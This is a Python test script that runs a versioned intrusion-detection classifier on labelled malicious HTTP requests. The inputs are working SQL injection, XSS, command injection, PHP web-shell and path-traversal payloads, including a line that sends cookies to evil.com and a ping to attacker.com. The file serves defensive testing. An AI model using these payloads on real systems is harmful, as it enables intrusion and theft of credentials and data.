import joblib, sys, argparse
from pathlib import Path
from ml_features_extraction_attack import extract_features

# Resumo: Teste do modelo de classificação

# -----------------------
# Parsing de argumentos
# -----------------------

parser = argparse.ArgumentParser(description = "Teste básico para o modelo de classificação")

parser.add_argument(
    "-v","--version",
    type=str,
    default="99",
    help="Escolha da versão do modelo de detecção para testar"
)

args = parser.parse_args()

# -----------------------
# Ajuste de Flags
# -----------------------

VERSION = args.version
if VERSION == "99": print("Necessário explicitar a versão do modelo para testar utilizando a flag " \
                  "-v ou --version. Use a flag --help ou veja o README para auxílio."); exit(1)

SCRIPT_DIR = Path(__file__).resolve().parent
MODEL_PATH = SCRIPT_DIR / 'attack_model_versions'

MODEL_ARCHIVE = MODEL_PATH / f"model{VERSION}.pkl"

if str(SCRIPT_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPT_DIR))

if not MODEL_ARCHIVE.exists():
    raise FileNotFoundError(f"Modelo não encontrado: {MODEL_ARCHIVE}")


# -----------------------
# Carregando Modelo
# -----------------------

model = joblib.load(MODEL_ARCHIVE)
vectorizer = joblib.load(MODEL_PATH / f"vectorizer{VERSION}.pkl")
scaler = joblib.load(MODEL_PATH / f"scaler{VERSION}.pkl")
method_encoder = joblib.load(MODEL_PATH / f"method_encoder{VERSION}.pkl")

model.verbose = False

# Auxiliar
number = 0

def classify(method, request, label=""):

    global number

    X = extract_features(method, request, vectorizer, scaler, method_encoder)

    proba = model.predict_proba(X)

    prediction = model.predict(X)

    label_str = f"  [{label}]" if label else ""

    print(f"Predição {number:02d}{label_str}: {prediction}  \tProb: {proba}")

    number += 1


print("\nRequisições Anômalas:\n")

# --- SQL Injection ---
classify("GET",  "id=1+OR+1=1",                                                                      "SQLi  01 - OR 1=1 básico")
classify("GET",  "id=1+UNION+SELECT+password+FROM+users",                                            "SQLi  02 - UNION SELECT")
classify("POST", "username=admin'+OR+1=1--",                                                         "SQLi  03 - OR 1=1 com comentário")
classify("POST", "username=admin'+or+'1'='1",                                                        "SQLi  04 - or '1'='1'")
classify("POST", "username=admin'%20OR%201=1",                                                       "SQLi  05 - URL-encoded OR")
classify("GET",  "id=1;+DROP+TABLE+users--",                                                         "SQLi  06 - Stacked query DROP")
classify("GET",  "id=1'+AND+SLEEP(5)--",                                                             "SQLi  07 - Blind time-based")
classify("GET",  "search=1'+UNION+SELECT+null,table_name+FROM+information_schema.tables--",          "SQLi  08 - information_schema dump")
classify("POST", "login=admin'--&password=irrelevant",                                               "SQLi  09 - Comment termination")
classify("GET",  "q=1'+ORDER+BY+3--",                                                                "SQLi  10 - ORDER BY (column count)")
classify("GET",  "page=1+OR+1=1+LIMIT+1--",                                                         "SQLi  11 - OR 1=1 com LIMIT")
classify("GET",  "id=1+AND+1=2+UNION+SELECT+username,password+FROM+admin--",                        "SQLi  12 - False condition + UNION")
classify("POST", "email=test@test.com'+OR+'1'='1'--&password=anything",                             "SQLi  13 - OR em campo email")

print("\n------------------------------------------------------------------------------\n")

# --- XSS ---
classify("GET",  "search=<script>alert(1)</script>",                                                 "XSS   01 - script tag básico")
classify("GET",  "q=%3Cscript%3Ealert(1)%3C/script%3E",                                             "XSS   02 - script tag URL-encoded")
classify("GET",  "s=%3Cimg+src%3D%22invalid-image%22+onerror%3D%22alert%28%27XSS%27%29%22%3E",      "XSS   03 - img onerror encoded")
classify("GET",  "name=<svg+onload=alert(1)>",                                                       "XSS   04 - svg onload")
classify("GET",  "msg=<body+onload=alert('XSS')>",                                                   "XSS   05 - body onload")
classify("GET",  "redirect=javascript:alert(document.cookie)",                                       "XSS   06 - javascript: protocol")
classify("POST", "comment=<img+src=x+onerror=alert(1)>",                                             "XSS   07 - img onerror simples")
classify("GET",  "q=<a href=javascript:alert(1)>click</a>",                                         "XSS   08 - anchor javascript href")
classify("GET",  "input=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",                             "XSS   09 - double-encoded script")
classify("GET",  "search=<details+open+ontoggle=alert(1)>",                                          "XSS   10 - details ontoggle")
classify("POST", "bio=<script>document.location='http://evil.com/?c='+document.cookie</script>",    "XSS   11 - cookie exfiltration")
classify("POST", "input=`id`",                                                                       "RCE   10 - backtick execution")

print("\n------------------------------------------------------------------------------\n")

# --- RCE ---
classify("GET",  "/../../../bin/sh",                                                                 "RCE   01 - path traversal /bin/sh")
classify("GET",  "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",    "RCE   02 - php://input wrapper")
classify("GET",  "cmd=cat+/etc/passwd",                                                              "RCE   03 - cat /etc/passwd")
classify("POST", "param=;+ls+-la",                                                                   "RCE   04 - shell injection ls")
classify("GET",  "file=php://filter/convert.base64-encode/resource=index.php",                      "RCE   05 - php://filter wrapper")
classify("GET",  "path=|cat+/etc/shadow",                                                            "RCE   06 - pipe injection")
classify("GET",  "cmd=ping+-c+4+attacker.com",                                                       "RCE   07 - ping exfiltration")
classify("POST", "upload=../../../var/www/shell.php",                                                "RCE   08 - webshell upload path")
classify("POST", "data=<?php+system($_GET['cmd']);+?>",                                              "RCE   09 - PHP system() injection")

print("\n------------------------------------------------------------------------------\n")

# --- LFI ---
classify("GET",  "page=../../../etc/passwd",                                                         "LFI   01 - traversal básico")
classify("GET",  "file=../../../../etc/shadow",                                                      "LFI   02 - /etc/shadow")
classify("GET",  "path=..%2F..%2F..%2Fetc%2Fpasswd",                                                "LFI   03 - URL-encoded ../")
classify("GET",  "include=....//....//....//etc/passwd",                                             "LFI   04 - ....// bypass")
classify("GET",  "template=../../../../../boot.ini",                                                  "LFI   05 - Windows boot.ini")
classify("GET",  "lang=../../../windows/system32/drivers/etc/hosts",                                 "LFI   06 - Windows hosts file")
classify("GET",  "doc=..%25%32%66..%25%32%66..%25%32%66etc/passwd",                                  "LFI   07 - double URL-encoded")
classify("POST", "config=../apache/php/php.ini",                                                     "LFI   08 - php.ini via POST")
classify("GET",  "file=/proc/self/environ",                                                          "LFI   09 - /proc/self/environ")
classify("GET",  "view=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",                                    "LFI   10 - %2e%2e%2f encoded")


